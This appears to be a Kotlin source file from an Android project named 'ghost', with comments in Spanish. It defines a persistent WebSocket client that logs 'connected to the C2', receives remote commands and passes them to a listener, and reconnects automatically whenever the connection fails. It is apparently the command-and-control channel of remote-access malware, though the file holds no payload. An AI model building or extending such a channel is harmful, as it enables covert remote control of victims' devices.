package com.ghost.android.network

import android.util.Log
import okhttp3.*
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

interface CommandListener {
    fun onCommandReceived(commandJson: String)
}

class WebSocketClient(private val listener: CommandListener) {
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS) // Lectura infinita para mantener conexión
        .build()
    
    private var webSocket: WebSocket? = null
    private val TAG = "WS_Client"

    fun connect(serverUrl: String) {
        val request = Request.Builder().url(serverUrl).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Conectado al C2")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Comando recibido: $text")
                listener.onCommandReceived(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Error de conexión", t)
                reconnect(serverUrl)
            }
        })
    }

    private fun reconnect(url: String) {
        // Lógica simple de reconexión exponencial podría ir aquí
        Log.d(TAG, "Intentando reconexión...")
        connect(url)
    }
}
